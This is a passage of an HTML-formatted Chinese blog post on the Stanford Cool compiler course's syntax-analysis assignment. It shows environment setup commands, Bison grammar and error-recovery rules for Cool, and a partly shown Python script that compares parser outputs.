plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">stack = &#123;&#125;</span><br><span class="line">while(true) &#123;</span><br><span class="line">  X = stack.pop();</span><br><span class="line"></span><br><span class="line">  if(ACTION[X, *input] = Sj) &#123;</span><br><span class="line">    stack.push(j);</span><br><span class="line">    ++input;</span><br><span class="line">  &#125;else if(ACTION[X, *input] = Rf) &#123;</span><br><span class="line">    stack.push(GOTO&#x27;[X, f(产生式)的头])</span><br><span class="line">    ++input;</span><br><span class="line">  &#125;else if(ACTION[X, *input)] = AC) &#123;break;&#125;</span><br><span class="line">  else &#123;error();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="slr分析表.png" alt="slr分析表"><br><img src="slr过程.png" alt="slr过程"></p></li></ol><h1 id="PA3-Syntax-Analysis"><a href="#PA3-Syntax-Analysis" class="headerlink" title="PA3 Syntax Analysis"></a>PA3 Syntax Analysis</h1><h2 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h2><p>  在该实验中，需要通过编写<strong>Bison</strong>规则，从而完成<strong>Cool</strong>的语法分析，并且返回一个抽象语法树<strong>(AST)</strong>。</p><p>  需要注意的是，实现的语法分析器应该具有足够的鲁棒性——可以在任何输入下都正常工作，即可以处理错误</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>  该实验中依赖<strong>2.4</strong>版本的<strong>Bison</strong>，和之前的<strong>Flex</strong>，则在<code>assignments/PA3</code>目录执行如下命令设置环境<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update \</span><br><span class="line">  &amp;&amp; <span class="built_in">sudo</span> apt-get install -y m4 \</span><br><span class="line">  &amp;&amp; (<span class="built_in">cd</span> ../../bin/flex; ./configure; make; <span class="built_in">sudo</span> make install) \</span><br><span class="line">  &amp;&amp; (<span class="built_in">cd</span> ../../bin/bison; ./configure; make; <span class="built_in">sudo</span> make install)</span><br></pre></td></tr></table></figure></p><h2 id="实验实现"><a href="#实验实现" class="headerlink" title="实验实现"></a>实验实现</h2><p>  下面是个人的思路及其<a href="https://gitee.com/jiaweihawk/stanford-compiler/tree/74dae99408996759f4046de1f75e41c0f5c6c70d/">实现</a></p><p>  实际上，这个实验就是定义解析<strong>Cool</strong>的<strong>Bison</strong>规则<br>  因此，需要了解<strong>Bison</strong>的使用方法——可以查看<a href="https://www.gnu.org/software/bison/manual/bison.html">Bison的手册</a>。虽然版本不一致，但是整体并没有太大的区别。</p><h3 id="词法规则"><a href="#词法规则" class="headerlink" title="词法规则"></a>词法规则</h3><p>  实际上，根据手册，<strong>Cool</strong>中定义了如下的语法规则<br>  <img src="语法规则.png" alt="语法规则"></p><p>  则将其转换为<strong>Bison</strong>规则即可，其中<strong>program</strong>和<strong>class</strong>已经存在了，则我们需要实现<strong>feature</strong>、<strong>formal</strong>和<strong>expr</strong>的规则即可</p><h4 id="feature"><a href="#feature" class="headerlink" title="feature"></a>feature</h4><p>  由于<strong>feature</strong>中涉及<script type="math/tex">[formal[,formal]^*]</script>，则其需要包含<strong>零个</strong>、<strong>一个</strong>和<strong>多个</strong>的<strong>formal</strong>的情况<br>  其中<strong>一个</strong>和<strong>多个</strong>的<strong>formal</strong>，使用实验环境中的<strong>链表</strong>结构表示即可，即<strong>formal_list2</strong>表示<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;%</span><br><span class="line">    %type &lt;features&gt; dummy_feature_list</span><br><span class="line">    %type &lt;feature&gt; feature</span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">    /* Feature list may be empty, but no empty features in list. */</span><br><span class="line">    dummy_feature_list</span><br><span class="line">    : feature                                          /* single feature */</span><br><span class="line">    &#123; $$ = single_Features($1); &#125;</span><br><span class="line">    | dummy_feature_list feature                       /* several features */</span><br><span class="line">    &#123; $$ = append_Features($1, single_Features($2)); &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">    feature</span><br><span class="line">    : OBJECTID &#x27;(&#x27; &#x27;)&#x27; &#x27;:&#x27; TYPEID &#x27;&#123;&#x27; expression &#x27;&#125;&#x27; &#x27;;&#x27;      /* 成员函数 */</span><br><span class="line">    &#123; $$ = method($1, nil_Formals(), $5, $7); &#125;</span><br><span class="line">    | OBJECTID formal_list2 &#x27;:&#x27; TYPEID &#x27;&#123;&#x27; expression &#x27;&#125;&#x27; &#x27;;&#x27; /* 成员函数 */</span><br><span class="line">    &#123; $$ = method($1, $2, $4, $6); &#125;</span><br><span class="line">    | OBJECTID &#x27;:&#x27; TYPEID ASSIGN expression &#x27;;&#x27;               /* 初始化成员变量 */</span><br><span class="line">    &#123; $$ = attr($1, $3, $5); &#125;</span><br><span class="line">    | OBJECTID &#x27;:&#x27; TYPEID &#x27;;&#x27;                                 /* 未初始化成员变量 */</span><br><span class="line">    &#123; $$ = attr($1, $3, no_expr()); &#125;</span><br><span class="line">    | OBJECTID error &#x27;;&#x27;                                  /* 成员函数错误处理 */</span><br><span class="line">    &#123; yyclearin; &#125;</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure></p><h4 id="formal"><a href="#formal" class="headerlink" title="formal"></a>formal</h4><p>  由于在<strong>feature</strong>中，包含<script type="math/tex">[formal[,formal]^*]</script><br>  则根据上面实现的<strong>feature</strong>规则，我们需要实现<script type="math/tex">formal[,formal]^*]</script>的规则，如下所示<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;%</span><br><span class="line">    /*</span><br><span class="line">     * Precedence declarations go here.</span><br><span class="line">     * formal_list1             [, formal]+</span><br><span class="line">     * formal_list2             (formal[, formal]*)</span><br><span class="line">     */</span><br><span class="line">    %type &lt;formals&gt; formal_list1 formal_list2</span><br><span class="line">    %type &lt;formal&gt; formal</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * formal_list1             [, formal]+</span><br><span class="line">     */</span><br><span class="line">    formal_list1</span><br><span class="line">    : formal                                                      /* single */</span><br><span class="line">    &#123; $$ = single_Formals($1); &#125;</span><br><span class="line">    | formal_list1 formal                                         /* serveral */</span><br><span class="line">    &#123; $$ = append_Formals($1, single_Formals($2)); &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * formal_list2             (formal[, formal]*)</span><br><span class="line">     */</span><br><span class="line">    formal_list2</span><br><span class="line">    : &#x27;(&#x27; OBJECTID &#x27;:&#x27; TYPEID &#x27;)&#x27;                                 /* single */</span><br><span class="line">    &#123; $$ = single_Formals(formal($2, $4)); &#125;</span><br><span class="line">    | &#x27;(&#x27; OBJECTID &#x27;:&#x27; TYPEID formal_list1 &#x27;)&#x27;                    /* several formals */</span><br><span class="line">    &#123; $$ = append_Formals(single_Formals(formal($2, $4)), $5); &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    formal</span><br><span class="line">    : &#x27;,&#x27; OBJECTID &#x27;:&#x27; TYPEID</span><br><span class="line">    &#123; $$ = formal($2, $4); &#125;</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure></p><h4 id="expr"><a href="#expr" class="headerlink" title="expr"></a>expr</h4><p>  最后则是<strong>expr</strong></p><ul><li>一方面，由于<strong>expr</strong>中多处包含诸如<script type="math/tex">[expr[,expr]^*]</script>、<script type="math/tex">[expr;]^+</script>、<script type="math/tex">[,ID:TYPE[<- expr]]^*</script>等<br>这里通过类似于上面的，将其以<strong>链表</strong>形式管理即可，然后根据对应的<strong>正则表达式</strong>，设置<strong>链表</strong>的构建规则即可</li><li><p>另一方面，为了避免<strong>Bison</strong>的<strong>Shift/Reduce Conflicts</strong>，通过设置运算符的优先级进行解决，手册中定义了<strong>Cool</strong>的运算符的优先级<br><img src="运算符的优先级.png" alt="运算符的优先级"></p><p>最终，<strong>expr</strong>的规则如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;%</span><br><span class="line">    %type &lt;cases&gt; case_list</span><br><span class="line">    %type &lt;case_&gt; case</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * expression_list1          expr[, expr]*</span><br><span class="line">     * expression_list2          [expr;]+</span><br><span class="line">    */</span><br><span class="line">    %type &lt;expressions&gt; expression_list1 expression_list2</span><br><span class="line">    %type &lt;expression&gt; expression expression_let</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * 通过声明优先级，尝试解决二义性问题</span><br><span class="line">     */</span><br><span class="line">    %right THEN ELSE                                      /* 尝试解决悬挂else问题 */</span><br><span class="line">    %right ASSIGN IN                                      /* 尝试解决expression优先级问题 */</span><br><span class="line">    %right NOT</span><br><span class="line">    %nonassoc LE &#x27;&lt;&#x27; &#x27;=&#x27;</span><br><span class="line">    %left &#x27;+&#x27; &#x27;-&#x27;</span><br><span class="line">    %left &#x27;*&#x27; &#x27;/&#x27;</span><br><span class="line">    %right ISVOID</span><br><span class="line">    %right &#x27;~&#x27;</span><br><span class="line">    %right &#x27;@&#x27;</span><br><span class="line">    %right &#x27;.&#x27; </span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">    case_list</span><br><span class="line">    : case &#x27;;&#x27;                                                    /* single branch */</span><br><span class="line">    &#123; $$ = single_Cases($1); &#125;</span><br><span class="line">    | case_list case &#x27;;&#x27;                                          /* several branches */</span><br><span class="line">    &#123; $$ = append_Cases($1, single_Cases($2)); &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">    case</span><br><span class="line">    : OBJECTID &#x27;:&#x27; TYPEID DARROW expression</span><br><span class="line">    &#123; $$ = branch($1, $3, $5); &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * expression_list1          expr[, expr]*</span><br><span class="line">     */</span><br><span class="line">    expression_list1</span><br><span class="line">    : expression                                                    /* single expression */</span><br><span class="line">    &#123; $$ = single_Expressions($1); &#125;</span><br><span class="line">    | expression_list1 &#x27;,&#x27; expression                               /* several expressions */</span><br><span class="line">    &#123; $$ = append_Expressions($1, single_Expressions($3)); &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * expression_list2          [expr;]+</span><br><span class="line">     */</span><br><span class="line">    expression_list2</span><br><span class="line">    : expression &#x27;;&#x27;                                              /* single expression */</span><br><span class="line">    &#123; $$ = single_Expressions($1); &#125;</span><br><span class="line">    | expression_list2 expression &#x27;;&#x27;                              /* several expressions */</span><br><span class="line">    &#123; $$ = append_Expressions($1, single_Expressions($2)); &#125;</span><br><span class="line">    | expression_list2 error &#x27;;&#x27;                                  /* 错误处理 */</span><br><span class="line">    &#123; $$ = $1; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * expression_let            ID:TYPE [&lt;- expr] [,ID:TYPE [&lt;- expr]] in expr</span><br><span class="line">     */</span><br><span class="line">    expression_let</span><br><span class="line">    : OBJECTID &#x27;:&#x27; TYPEID IN expression                           /* ID : TYPE in expr */</span><br><span class="line">    &#123; $$ = let($1, $3, no_expr(), $5); &#125;</span><br><span class="line">    | OBJECTID &#x27;:&#x27; TYPEID ASSIGN expression IN expression         /* ID : TYPE &lt;- expr in expr */</span><br><span class="line">    &#123; $$ = let($1, $3, $5, $7); &#125;</span><br><span class="line">    | OBJECTID &#x27;:&#x27; TYPEID &#x27;,&#x27; expression_let                      /* ID : TYPE [, ID : TYPE [&lt;- expr]]+ in expr */</span><br><span class="line">    &#123; $$ = let($1, $3, no_expr(), $5); &#125;</span><br><span class="line">    | OBJECTID &#x27;:&#x27; TYPEID ASSIGN expression &#x27;,&#x27; expression_let    /* ID : TYPE &lt;- expr [, ID : TYPE [&lt;- expr]]+ in expr */</span><br><span class="line">    &#123; $$ = let($1, $3, $5, $7); &#125;</span><br><span class="line">    | error &#x27;,&#x27; expression_let                                    /* 错误处理 */</span><br><span class="line">    &#123; $$ = $3; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">    expression</span><br><span class="line">    : OBJECTID ASSIGN expression                                  /* ID &lt;- expr */</span><br><span class="line">    &#123; $$ = assign($1, $3); &#125;</span><br><span class="line">    | expression &#x27;.&#x27; OBJECTID &#x27;(&#x27; &#x27;)&#x27;                             /* expr.ID([expr[, expr]*]) */</span><br><span class="line">    &#123; $$ = dispatch($1, $3, nil_Expressions()); &#125;</span><br><span class="line">    | expression &#x27;.&#x27; OBJECTID &#x27;(&#x27; expression_list1 &#x27;)&#x27;</span><br><span class="line">    &#123; $$ = dispatch($1, $3, $5); &#125;</span><br><span class="line">    | expression &#x27;@&#x27; TYPEID &#x27;.&#x27; OBJECTID &#x27;(&#x27; expression_list1 &#x27;)&#x27; /* expr@TYPE.ID([expr[, expr]*]) */</span><br><span class="line">    &#123; $$ = static_dispatch($1, $3, $5, $7); &#125;</span><br><span class="line">    | expression &#x27;@&#x27; TYPEID &#x27;.&#x27; OBJECTID &#x27;(&#x27; &#x27;)&#x27;</span><br><span class="line">    &#123; $$ = static_dispatch($1, $3, $5, nil_Expressions()); &#125;</span><br><span class="line">    | OBJECTID &#x27;(&#x27; expression_list1 &#x27;)&#x27;                           /* ID([expr[, expr]*]) */</span><br><span class="line">    &#123; $$ = dispatch(object(idtable.add_string(&quot;self&quot;)), $1, $3); &#125;</span><br><span class="line">    | OBJECTID &#x27;(&#x27; &#x27;)&#x27;</span><br><span class="line">    &#123; $$ = dispatch(object(idtable.add_string(&quot;self&quot;)), $1, nil_Expressions()); &#125;</span><br><span class="line">    | IF expression THEN expression ELSE expression FI            /* if expr then expr else expr fi */</span><br><span class="line">    &#123; $$ = cond($2, $4, $6); &#125;</span><br><span class="line">    | WHILE expression LOOP expression POOL                       /* while expr loop expr pool */</span><br><span class="line">    &#123; $$ = loop($2, $4); &#125;</span><br><span class="line">    | &#x27;&#123;&#x27; expression_list2 &#x27;&#125;&#x27;                                    /* &#123;[expr;]+&#125; */</span><br><span class="line">    &#123; $$ = block($2); &#125;</span><br><span class="line">    | LET expression_let                                          /* ID : TYPE &lt;- expr [, ID : TYPE [&lt;- expr]]+ in expr */</span><br><span class="line">    &#123; $$ = $2; &#125;</span><br><span class="line">    | CASE expression OF case_list ESAC                           /* typcase */ </span><br><span class="line">    &#123; $$ = typcase($2, $4); &#125;</span><br><span class="line">    | NEW TYPEID                                                  /* new Type */</span><br><span class="line">    &#123; $$ = new_($2); &#125;</span><br><span class="line">    | ISVOID expression                                           /* isvoid expr */</span><br><span class="line">    &#123; $$ = isvoid($2); &#125;</span><br><span class="line">    | expression &#x27;+&#x27; expression                                   /* expr + expr */</span><br><span class="line">    &#123; $$ = plus($1, $3); &#125;</span><br><span class="line">    | expression &#x27;-&#x27; expression                                   /* expr - expr */</span><br><span class="line">    &#123; $$ = sub($1, $3); &#125;</span><br><span class="line">    | expression &#x27;*&#x27; expression                                   /* expr * expr */</span><br><span class="line">    &#123; $$ = mul($1, $3); &#125;</span><br><span class="line">    | expression &#x27;/&#x27; expression                                   /* expr / expr */</span><br><span class="line">    &#123; $$ = divide($1, $3); &#125;</span><br><span class="line">    | &#x27;~&#x27; expression                                              /* ~expr */</span><br><span class="line">    &#123; $$ = neg($2); &#125;</span><br><span class="line">    | expression &#x27;&lt;&#x27; expression                                   /* expr &lt; expr */</span><br><span class="line">    &#123; $$ = lt($1, $3); &#125;</span><br><span class="line">    | expression LE expression                                    /* expr &lt;= expr */</span><br><span class="line">    &#123; $$ = leq($1, $3); &#125;</span><br><span class="line">    | expression &#x27;=&#x27; expression                                    /* expr = expr */</span><br><span class="line">    &#123; $$ = eq($1, $3); &#125;</span><br><span class="line">    | NOT expression                                              /* not expr */</span><br><span class="line">    &#123; $$ = comp($2); &#125;</span><br><span class="line">    | &#x27;(&#x27; expression &#x27;)&#x27;                                          /* (expr) */</span><br><span class="line">    &#123; $$ = $2; &#125;</span><br><span class="line">    | OBJECTID                                                    /* ID */</span><br><span class="line">    &#123; $$ = object($1); &#125;</span><br><span class="line">    | INT_CONST                                                   /* integer */</span><br><span class="line">    &#123; $$ = int_const($1); &#125;</span><br><span class="line">    | STR_CONST                                                   /* string */</span><br><span class="line">    &#123; $$ = string_const($1); &#125;</span><br><span class="line">    | BOOL_CONST                                                  /* true/false */</span><br><span class="line">    &#123; $$ = bool_const($1); &#125;</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure></li></ul><h3 id="错误恢复"><a href="#错误恢复" class="headerlink" title="错误恢复"></a>错误恢复</h3><p>  根据实验手册要求，当语法分析发现错误时，对于特定的情况需要恢复到正常情况</p><ol><li><strong>class</strong>定义错误，但是其适当的闭合。则应该可以继续解析下一个<strong>class</strong>定义</li><li><strong>feature</strong>定义错误，但是其适当的闭合。则应该可以继续解析下一个<strong>feature</strong></li><li><strong>let</strong>的绑定错误，但是有适当的分隔符<strong>,</strong>。则应该可以继续解析<strong>let</strong>的下一个绑定声明</li><li><strong>block</strong>定义错误，但是有适当的分隔符<strong>;</strong>。则应该可以继续解析<strong>block</strong>的下一个语句</li></ol><p>  而实际上，错误恢复就是定义规则，并在规则中执行错误情况的动作，具体如下所示<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;%</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">    class_list</span><br><span class="line">    : ...</span><br><span class="line">    | class_list error                                  /* 错误处理 */</span><br><span class="line">    &#123; $$ = $1; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">    class</span><br><span class="line">    : ...</span><br><span class="line">    | CLASS error &#x27;;&#x27;                                  /* 类定义的错误处理 */</span><br><span class="line">    &#123; yyclearin; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">    feature</span><br><span class="line">    : ...</span><br><span class="line">    | OBJECTID error &#x27;;&#x27;                                  /* 成员函数错误处理 */</span><br><span class="line">    &#123; yyclearin; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * expression_list2          [expr;]+</span><br><span class="line">     */</span><br><span class="line">    expression_list2</span><br><span class="line">    : ...</span><br><span class="line">    | expression_list2 error &#x27;;&#x27;                                  /* 错误处理 */</span><br><span class="line">    &#123; $$ = $1; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * expression_let            ID:TYPE [&lt;- expr] [,ID:TYPE [&lt;- expr]] in expr</span><br><span class="line">     */</span><br><span class="line">    expression_let</span><br><span class="line">    : ...</span><br><span class="line">    | error &#x27;,&#x27; expression_let                                    /* 错误处理 */</span><br><span class="line">    &#123; $$ = $3; &#125;</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure></p><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><h3 id="cmp-py"><a href="#cmp-py" class="headerlink" title="cmp.py"></a>cmp.py</h3><p>  为了观察自己实现的语法解析程序的效果，通过与标准的语法解析器的输出进行比较来实现</p><p>  这里还需要通过正则表达式过滤掉行号，因为标准的语法解析器行号有些不太正确<br>  程序的源代码如下所示<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">参数1：            path         字符串，表明要读取的文件路径</span></span><br><span class="line"><span class="string">返回值：                        列表，每一个元素表示一行的信息</span></span><br><span class="line"><span class="string">读取制定文件的词法解析结果</span></span><br><span class="line"><span class="string">即通过正则表达式，读取#[0-9]+ (.*)的的输入即可，其每一行的信息为(行号，内容)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_lexical_result</span>(<span class="params">path</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            result = re.<span class="keyword">match</span>(<span class="string">r&#x27;#([0-9]+) (.*)$&#x27;</span>, line)</span><br><span class="line">            <span class="keyword">if</span>(result):</span><br><span class="line">                res.append([result.group(<span class="number">1</span>), result.group(<span class="number">2</span>)])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) &lt; <span class="number">4</span>):</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        sys.argv[1]表示原始文件名称</span></span><br><span class="line"><span class="string">        sys.argv[2]表示标准词法解析器的结果</span></span><br><span class="line"><span class="string">        sys.argv[3]表示自己实现的词法解析器的结果</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    lexer_output = read_lexical_result(sys.argv[<span class="number">2</span>])</span><br><span class="line">    mylexer_output = read_lexical_result(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">    same_number = <span class="number">0</span></span><br><span class="line">    diff_result = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lexer_output)):</span><br><span class="line">        <span class="keyword">if</span>(lexer_output[i][<span class="number">1</span>] == mylexer_output[i][<span class="number">1</span>]):</span><br><span class="line">            same_number += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            diff_result.append([mylexer_output[i][<span class="number">0</span>], lexer_output[i][<span class="number">1</span>], mylexer_output[i][<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[32;1m%s: %d/%d\033[0m&quot;</span>%(sys.argv[<span class="number">1</span>], same_number, <span class="built_in">len</span>(lexer_output)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(diff_result)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;#%s: \033[32;1mlexer_output: %s; \033[31;1mmylexer_output: %s\033[0m&#x27;</span>%(diff_result[i][<span class="number">0</span>], diff_result[i][<span class="number">1</span>], diff_result[i][<span 